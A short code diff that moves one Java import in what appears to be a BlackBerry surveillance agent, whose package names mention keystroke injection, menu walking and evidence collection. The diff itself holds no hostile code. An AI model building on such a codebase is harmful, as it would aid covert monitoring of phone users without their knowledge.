@@ -27,6 +27,7 @@ import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AppListener;
 import blackberry.config.Conf;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -35,7 +36,6 @@ import blackberry.fs.Path;
 import blackberry.injection.KeyInjector;
 import blackberry.injection.MenuWalker;
 import blackberry.interfaces.BacklightObserver;
-import blackberry.utils.Check;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
